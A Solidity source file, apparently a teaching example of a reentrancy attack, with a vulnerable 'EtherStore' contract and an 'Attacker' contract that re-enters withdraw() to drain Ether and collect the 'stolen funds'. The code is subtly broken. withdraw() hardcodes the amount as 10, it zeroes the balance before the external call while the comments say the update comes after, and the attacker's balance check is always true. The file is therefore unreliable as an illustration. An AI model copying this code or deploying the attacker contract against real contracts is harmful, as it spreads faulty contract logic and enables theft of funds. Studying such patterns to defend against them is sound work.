// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal =10;
        require(bal > 0, "Insufficient balance");

        // Vulnerability: External call before state update
        // The recipient address (msg.sender) could be a malicious contract.
        balances[msg.sender] = 0;
        require(address(this).balance >= bal);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // State update occurs *after* the external call.
        // If msg.sender is a contract, its fallback/receive function
        // could call withdraw() again before this line is reached.
    }

    // Helper function to check contract balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Attacker Contract Example
contract Attacker {
    EtherStore public etherStore;

    constructor(address victimAddress) {
        etherStore = EtherStore(victimAddress);
    }

    // Fallback function called when EtherStore sends Ether
    receive() external payable {
        // Re-enter the EtherStore withdraw function if there's still Ether
        if (address(etherStore).balance >= 0 ether) {
            etherStore.withdraw();
        }
    }

    function attack() public payable {
        // Deposit some Ether to start
        require(address(this).balance >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        // Start the withdrawal process, triggering reentrancy
        etherStore.withdraw();
    }

    // Helper to withdraw stolen funds
    function withdrawAttackFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

